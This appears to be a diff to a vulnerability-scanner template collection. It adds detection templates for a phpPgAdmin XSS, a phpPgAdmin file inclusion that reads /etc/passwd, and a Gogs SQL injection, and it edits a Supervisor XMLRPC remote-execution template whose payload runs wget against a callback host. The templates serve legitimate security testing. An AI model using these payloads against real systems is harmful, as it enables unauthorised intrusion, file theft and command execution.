@@ -398,6 +398,50 @@
       ]
     },
     {
+      "id": "CVE-2007-5728",
+      "info": {
+        "author": "dhiyaneshDK",
+        "description": "Cross-site scripting (XSS) vulnerability in phpPgAdmin 3.5 to 4.1.1, and possibly 4.1.2, allows remote attackers to inject arbitrary web script or HTML via certain input available in PHP_SELF in (1) redirect.php, possibly related to (2) login.php, different vectors than CVE-2007-2865.",
+        "metadata": {
+          "shodan-query": "http.title:\"phpPgAdmin\""
+        },
+        "name": "phpPgAdmin 4.1.1 - 'Redirect.php' Cross-Site Scripting",
+        "reference": "https://www.exploit-db.com/exploits/30090",
+        "severity": "medium",
+        "tags": "cve,cve2007,xss,pgadmin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "<script>alert(\"document.domain\")</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/redirect.php/%22%3E%3Cscript%3Ealert(%22document.domain%22)%3C/script%3E?subject=server&server=test"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2008-2398",
       "info": {
         "author": "unstabl3",
@@ -543,6 +587,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_extplorer&action=show_error&dir=..%2F..%2F..%2F%2F..%2F..%2Fetc%2Fpasswd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2008-5587",
+      "info": {
+        "author": "dhiyaneshDK",
+        "description": "Directory traversal vulnerability in libraries/lib.inc.php in phpPgAdmin 4.2.1 and earlier, when register_globals is enabled, allows remote attackers to read arbitrary files via a .. (dot dot) in the _language parameter to index.php.",
+        "metadata": {
+          "shodan-query": "http.title:\"phpPgAdmin\""
+        },
+        "name": "phpPgAdmin 4.2.1 - '_language' Local File Inclusion",
+        "reference": "https://www.exploit-db.com/exploits/7363",
+        "severity": "medium",
+        "tags": "cve2008,lfi,phppgadmin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/phpPgAdmin/index.php?_language=../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -8088,6 +8169,53 @@
       ]
     },
     {
+      "id": "CVE-2014-8682",
+      "info": {
+        "author": "dhiyaneshDK",
+        "description": "Multiple SQL injection vulnerabilities in Gogs (aka Go Git Service) 0.3.1-9 through 0.5.x before 0.5.6.1105 Beta allow remote attackers to execute arbitrary SQL commands via the q parameter to (1) api/v1/repos/search, which is not properly handled in models/repo.go, or (2) api/v1/users/search, which is not properly handled in models/user.go.",
+        "metadata": {
+          "shodan-query": "title:\"Sign In - Gogs\""
+        },
+        "name": "Gogs - 'users'/'repos' '?q' SQL Injection",
+        "reference": [
+          "http://www.securityfocus.com/bid/71187",
+          "http://seclists.org/fulldisclosure/2014/Nov/33",
+          "http://packetstormsecurity.com/files/129117/Gogs-Repository-Search-SQL-Injection.html",
+          "http://gogs.io/docs/intro/change_log.html",
+          "https://github.com/gogits/gogs/commit/0c5ba4573aecc9eaed669e9431a70a5d9f184b8d",
+          "http://www.exploit-db.com/exploits/35238",
+          "https://exchange.xforce.ibmcloud.com/vulnerabilities/98694",
+          "http://www.securityfocus.com/archive/1/533995/100/0/threaded"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2014,sqli,gogs"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "\"ok\":true",
+                "\"data\""
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/api/v1/repos/search?q=%27)%09UNION%09SELECT%09*%09FROM%09(SELECT%09null)%09AS%09a1%09%09JOIN%09(SELECT%091)%09as%09u%09JOIN%09(SELECT%09user())%09AS%09b1%09JOIN%09(SELECT%09user())%09AS%09b2%09JOIN%09(SELECT%09null)%09as%09a3%09%09JOIN%09(SELECT%09null)%09as%09a4%09%09JOIN%09(SELECT%09null)%09as%09a5%09%09JOIN%09(SELECT%09null)%09as%09a6%09%09JOIN%09(SELECT%09null)%09as%09a7%09%09JOIN%09(SELECT%09null)%09as%09a8%09%09JOIN%09(SELECT%09null)%09as%09a9%09JOIN%09(SELECT%09null)%09as%09a10%09JOIN%09(SELECT%09null)%09as%09a11%09JOIN%09(SELECT%09null)%09as%09a12%09JOIN%09(SELECT%09null)%09as%09a13%09%09JOIN%09(SELECT%09null)%09as%09a14%09%09JOIN%09(SELECT%09null)%09as%09a15%09%09JOIN%09(SELECT%09null)%09as%09a16%09%09JOIN%09(SELECT%09null)%09as%09a17%09%09JOIN%09(SELECT%09null)%09as%09a18%09%09JOIN%09(SELECT%09null)%09as%09a19%09%09JOIN%09(SELECT%09null)%09as%09a20%09%09JOIN%09(SELECT%09null)%09as%09a21%09%09JOIN%09(SELECT%09null)%09as%09a22%09where%09(%27%25%27=%27"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2014-8799",
       "info": {
         "author": "daffainfo",
@@ -11787,7 +11915,7 @@
         "metadata": {
           "shodan-query": "http.title:\"Supervisor Status\""
         },
-        "name": "Supervisor XMLRPC Exec (CVE-2017-11610)",
+        "name": "Supervisor XMLRPC Exec",
         "reference": [
           "https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/linux/http/supervisor_xmlrpc_exec.md",
           "https://nvd.nist.gov/vuln/detail/CVE-2017-11610"
@@ -11799,7 +11927,6 @@
         {
           "matchers": [
             {
-              "name": "http",
               "part": "interactsh_protocol",
               "type": "word",
               "words": [
@@ -11808,7 +11935,7 @@
             }
           ],
           "raw": [
-            "POST /RPC2 HTTP/1.1\nHost: {{Hostname}}\nAccept: text/xml\nContent-type: text/xml\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Length:\n\n<methodCall>\n  <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>\n  <params>\n    <param>\n      <string>wget http://{{interactsh-url}}</string>\n    </param>\n  </params>\n</methodCall>\n"
+            "POST /RPC2 HTTP/1.1\nHost: {{Hostname}}\nAccept: text/xml\nContent-type: text/xml\n\n<methodCall>\n  <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>\n  <params>\n    <param>\n      <string>wget http://{{interactsh-url}}</string>\n    </param>\n  </params>\n</methodCall>\n"
           ]
         }
       ]
